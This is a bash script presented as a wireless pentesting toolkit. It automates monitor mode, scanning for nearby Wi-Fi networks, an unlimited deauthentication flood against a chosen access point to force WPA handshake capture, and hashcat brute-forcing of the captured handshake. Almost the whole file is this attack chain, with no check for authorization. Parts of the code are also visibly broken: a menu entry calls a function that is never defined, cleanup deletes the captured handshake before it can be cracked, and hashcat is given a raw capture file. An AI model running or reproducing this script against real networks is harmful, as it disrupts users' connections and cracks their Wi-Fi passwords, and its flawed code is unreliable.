#!/bin/bash

# Global variables
HANDSHAKE_FILE=""
SELECTED_WORDLIST=""
MON_IFACE=""
BSSID=""
CHANNEL=""

# Dependency check
check_deps() {
    local deps=("sudo" "fzf" "aircrack-ng" "aireplay-ng" "airodump-ng" "hashcat")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo "Error: $dep not installed!"
            exit 1
        fi
    done
}

# Main menu
main_menu() {
    clear
    while true; do
        choice=$(printf '%s\n' \
            "Deauth Monitor" \
            "Capture Handshake" \
            "Select Wordlist" \
            "Brute Force Handshake" \
            "Exit" | fzf --prompt="Main Menu > " --height=40% --reverse --header="Wireless Pentesting Toolkit")
        
        case "$choice" in
            "Deauth Monitor") deauth_monitor ;;
            "Capture Handshake") capture_handshake ;;
            "Select Wordlist") select_wordlist ;;
            "Brute Force Handshake") brute_force ;;
            "Exit") exit 0 ;;
        esac
    done
}

# Interface selection
select_interface() {
    clear
    interfaces=($(airmon-ng | awk '/^ /{print $2}'))
    [ ${#interfaces[@]} -eq 0 ] && echo "No interfaces found!" && exit 1
    
    SELECTED_IFACE=$(printf '%s\n' "${interfaces[@]}" | fzf --prompt="Select interface > " --header="Available Interfaces")
    [ -z "$SELECTED_IFACE" ] && echo "No interface selected!" && return 1
}

# Enable monitor mode
enable_monitor() {
    airmon-ng check kill &>/dev/null
    airmon-ng start "$SELECTED_IFACE" &>/dev/null
    MON_IFACE="${SELECTED_IFACE}mon"
}

# Scan networks
scan_networks() {
    timeout 15s airodump-ng -w scan --output-format csv "$MON_IFACE" &>/dev/null
    sed -i '/^Station MAC/,$d' scan-01.csv
}

# Target selection
select_target() {
    target=$(awk -F',' 'NR>5 && length($1) == 17 {print $1","$4","$6}' scan-01.csv | 
        fzf --prompt="Select target > " --header="BSSID,Channel,ESSID" --delimiter=',' --with-nth=1,3)
    
    BSSID=$(echo "$target" | cut -d',' -f1)
    CHANNEL=$(echo "$target" | cut -d',' -f2 | xargs)
    ESSID=$(echo "$target" | cut -d',' -f3)
}

# Handshake capture
capture_handshake() {
    if [[ $(id -u) != 0 ]]; then
        echo "Must be run as root!"
        exit 1
    fi

    select_interface || return
    enable_monitor
    scan_networks
    select_target || { cleanup; return; }

    echo -e "\nStarting handshake capture on $ESSID (BSSID: $BSSID)"
    
    # Start capture
    airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w handshake "$MON_IFACE" &>/dev/null &
    AIRODUMP_PID=$!
    
    # Start deauth
    aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE" &>/dev/null &
    AIREPLAY_PID=$!
    
    # Wait for handshake
    read -n 1 -s -r -p "Press any key to stop capture..."
    kill $AIRODUMP_PID $AIREPLAY_PID
    
    # Verify handshake
    if aircrack-ng handshake-01.cap | grep -q "1 handshake"; then
        HANDSHAKE_FILE="handshake-01.cap"
        echo -e "\nHandshake captured successfully!"
    else
        echo -e "\nFailed to capture handshake!"
        rm -f handshake-01.*
    fi
    
    cleanup
}

# Wordlist selection
select_wordlist() {
    clear
    local start_dir="$HOME"
    while true; do
        SELECTED_WORDLIST=$(
            find "$start_dir" -type f \( -name "*.txt" -o -name "*.lst" \) 2>/dev/null |
            fzf --height 80% --reverse --prompt "Select wordlist > " \
                --header "[Enter] Select | [Esc] Cancel | [←] Back" \
                --preview "head -n 25 {} 2>/dev/null || echo 'Preview not available'" \
                --preview-window right:60%
        )
        
        [ -n "$SELECTED_WORDLIST" ] && break
        
        # Directory navigation
        new_dir=$(find "$start_dir" -type d 2>/dev/null | 
            fzf --height 80% --reverse --prompt "Navigate to directory > " \
                --header "$start_dir")
        [ -z "$new_dir" ] && return
        start_dir="$new_dir"
    done
}

# Hashcat brute force
brute_force() {
    [ -z "$HANDSHAKE_FILE" ] && echo "No handshake file!" && return
    [ -z "$SELECTED_WORDLIST" ] && echo "No wordlist selected!" && return

    echo -e "\nStarting brute force attack..."
    hashcat -m 22000 "$HANDSHAKE_FILE" "$SELECTED_WORDLIST" --force -O
}

# Cleanup
cleanup() {
    airmon-ng stop "$MON_IFACE" &>/dev/null
    rm -f scan-01.csv handshake-01.* *.csv *.netxml &>/dev/null
}

# Main execution
trap cleanup EXIT
check_deps
main_menu
